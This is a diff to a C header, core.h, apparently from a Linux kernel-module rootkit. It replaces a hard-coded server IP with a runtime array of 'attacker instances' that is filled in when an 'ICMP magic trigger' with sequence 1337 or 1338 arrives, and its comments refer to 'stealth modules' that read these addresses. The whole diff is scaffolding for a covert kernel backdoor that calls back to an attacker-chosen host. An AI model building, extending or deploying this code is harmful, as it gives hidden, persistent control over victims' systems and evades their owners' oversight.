@@ -1,10 +1,18 @@
 #ifndef CORE_H
 #define CORE_H
 
-#define YOUR_SRV_IP "192.131.142.117"
-#define YOUR_SRV_IP2 "YOUR_FRIEND_IP_HERE"
-#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }
-#define YOUR_SRV_IPv6_2 { .s6_addr = { [15] = 1 } }
+/* Maximum number of attacker instances (one IP slot per instance) */
+#define MAX_INSTANCES 2
+
+/* Dynamic per-instance server IPs, populated at runtime when the ICMP magic
+ * trigger arrives.  Slot 0 = magic seq 1337, slot 1 = magic seq 1338.
+ * Defined in modules/icmp.c; all stealth modules read this array. */
+extern __be32 g_srv_ips[MAX_INSTANCES];
+
+/* Protects g_srv_ips[] against concurrent writes (ICMP softirq) and reads
+ * (hook functions in various contexts).  Always use spin_lock_irqsave /
+ * spin_unlock_irqrestore so it is safe regardless of caller context. */
+extern spinlock_t g_srv_ips_lock;
 
 #include <linux/module.h>
 #include <linux/kernel.h>
